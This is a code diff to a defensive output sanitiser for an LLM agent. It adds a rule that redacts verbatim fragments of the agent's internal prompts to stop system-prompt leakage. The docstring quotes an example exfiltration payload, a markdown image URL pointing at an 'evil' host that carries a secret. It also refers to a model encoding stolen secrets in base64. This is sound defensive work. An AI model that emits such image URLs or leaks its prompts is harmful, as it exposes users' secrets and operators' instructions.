@@ -5,7 +5,7 @@ L1 (guard.py) constrains CONTROL FLOW (who runs next). This layer constrains CON
 the point of harm: whatever the model was talked into, these rules decide what actually
 leaves the system. Pure functions, no network, no LangChain -> unit-testable offline.
 
-Three rules (the LLM-judge backstop is a separate, later step):
+Four rules (the LLM-judge backstop is a separate, later step):
 
   1. strip_images        Remove ALL markdown/HTML images. Images auto-load, so a URL like
                          ![x](https://evil/log?d=<secret>) leaks with ZERO user clicks
@@ -17,6 +17,11 @@ Three rules (the LLM-judge backstop is a separate, later step):
   3. redact_b64_blobs    Redact base64-looking blobs that decode to printable text. Catches
                          a secret the model encoded itself — models often encode WRONG, so
                          exact-match on the planted encoding misses it (seen: exfil case 4).
+
+  4. redact_prompt_fragments
+                         Redact any run of >= 6 consecutive words that appears verbatim in one
+                         of the agent's internal prompts (system-prompt leakage, OWASP LLM07).
+                         Verbatim-run matching, not semantic: a paraphrase of the prompt passes.
 
 Known limits (be honest in the write-up):
   - Rule 2 is a heuristic registry built from the user's own message. A production system
@@ -148,10 +153,58 @@ def redact_b64_blobs(text: str) -> tuple[str, list]:
 
 
 # ---------------------------------------------------------------------------
+# Rule 4 — verbatim fragments of internal prompts
+# ---------------------------------------------------------------------------
+
+PROMPT_REDACTED = "[REDACTED: internal instructions]"
+_WORD = re.compile(r"[A-Za-z0-9']+")
+SHINGLE = 6  # consecutive words; a natural report essentially never repeats 6 prompt words in a row
+
+
+def _words(text: str) -> list:
+    return [(m.group(0).lower(), m.start(), m.end()) for m in _WORD.finditer(text)]
+
+
+def _prompt_shingles(prompts, n: int = SHINGLE) -> set:
+    grams = set()
+    for p in prompts:
+        # drop markdown-heading lines: the report template ("## Key Findings") is public by design
+        body = "\n".join(l for l in p.splitlines() if not l.lstrip().startswith("#"))
+        w = [t[0] for t in _words(body)]
+        grams.update(tuple(w[i:i + n]) for i in range(len(w) - n + 1))
+    return grams
+
+
+def redact_prompt_fragments(text: str, prompts) -> tuple[str, list]:
+    if not prompts:
+        return text, []
+    grams = _prompt_shingles(prompts)
+    toks = _words(text)
+    covered = [False] * len(toks)
+    for i in range(len(toks) - SHINGLE + 1):
+        if tuple(t[0] for t in toks[i:i + SHINGLE]) in grams:
+            for j in range(i, i + SHINGLE):
+                covered[j] = True
+    spans, i = [], 0
+    while i < len(toks):
+        if covered[i]:
+            j = i
+            while j + 1 < len(toks) and covered[j + 1]:
+                j += 1
+            spans.append((toks[i][1], toks[j][2]))
+            i = j + 1
+        else:
+            i += 1
+    for a, b in reversed(spans):
+        text = text[:a] + PROMPT_REDACTED + text[b:]
+    return text, ([f"redacted {len(spans)} verbatim fragment(s) of internal prompts"] if spans else [])
+
+
+# ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
 
-def sanitize_output(text: str, question: str = "") -> GuardResult:
+def sanitize_output(text: str, question: str = "", protected_prompts=()) -> GuardResult:
     """Apply all rules to the final report. Order matters: sensitive values first (so a
     value inside an image URL is still counted), then images, then generic base64."""
     events: list = []
@@ -161,5 +214,7 @@ def sanitize_output(text: str, question: str = "") -> GuardResult:
     text, ev = strip_images(text)
     events += ev
     text, ev = redact_b64_blobs(text)
+    events += ev
+    text, ev = redact_prompt_fragments(text, protected_prompts)
     events += ev
     return GuardResult(text=text, events=events)
